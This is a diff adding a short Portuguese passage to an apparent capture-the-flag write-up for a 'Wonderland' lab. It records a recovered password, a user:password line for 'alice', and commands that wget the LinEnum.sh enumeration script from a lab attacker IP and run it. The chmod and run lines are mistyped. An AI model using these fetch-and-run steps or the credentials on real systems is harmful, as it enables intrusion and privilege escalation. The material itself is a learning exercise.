@@ -54,3 +54,32 @@ alice:HowDothTheLittleCrocodileImproveHisShiningTail
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+![image](https://github.com/yanfernandess/Wonderland/assets/100174458/06a7aae5-14ff-4c14-a907-85d0c0a70d0a)
+
+Descobrimos uma senha.
+
+WhyIsARavenLikeAWritingDesk?
+
+Após esse ponto eu não tinha mais noção do que fazer pois passei por todos personagens do filme e então dei uma pesquisada e o LinEnum.sh ajuda a enumerar mais a fundo. Em uma pesquisa que eu fiz me mostraram que eu deveria executar os seguintes comandos
+
+wget http://10.10.204.123:6969/LinEnum.sh
+chmod +x LinEnum. eh
+./LinEnum. eh
+
+
+
+
